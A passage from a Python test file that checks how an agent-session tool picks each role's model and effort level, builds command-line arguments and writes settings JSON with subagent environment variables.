    for picked, runs in (("claude-sonnet-5", "claude-sonnet-5[1m]"), ("claude-haiku-4-5-20251001", "claude-haiku-4-5-20251001")):
        m = config.models_for(None, {"models": {"orient": {"model": picked}}})
        assert m["orient"]["model"] == runs
        assert (m["subagents"]["model"], m["subagents"]["follows"]) == (picked, "orient")
    assert config.models_for(None, {"models": {"dev": {"model": "claude-sonnet-5"}}})["dev"]["model"] == "claude-sonnet-5"


def test_a_session_and_an_agent_take_their_roles_model_and_effort(tmp_path, monkeypatch):
    """agent_session passes a role's model as --model (none for '', the analyst's default) and puts a role's model and
    effort into an agent definition in place of its file's."""

    argv = agent_session.command(["--agent", "x"], "sid", "high", "{}", tmp_path, append_shared=False, model="claude-opus-5")
    assert argv[argv.index("--model") + 1] == "claude-opus-5" and argv.index("--model") < argv.index("--effort")
    assert "--model" not in agent_session.command(["--agent", "x"], "sid", "high", "{}", tmp_path, append_shared=False)
    agent = {"model": "opus", "effort": "high", "prompt": "p"}
    assert agent_session.role_agent(agent, {"model": "claude-sonnet-5", "effort": ""}) == {"model": "claude-sonnet-5", "effort": "high", "prompt": "p"}
    assert json.loads(agent_session.settings_json("max", {"CLAUDE_CODE_SUBAGENT_MODEL": "claude-sonnet-5"}, fastMode=True)) == {
        "fastMode": True, "env": {"CLAUDE_CODE_SUBAGENT_MODEL": "claude-sonnet-5", "CLAUDE_CODE_EFFORT_LEVEL": "max"}}


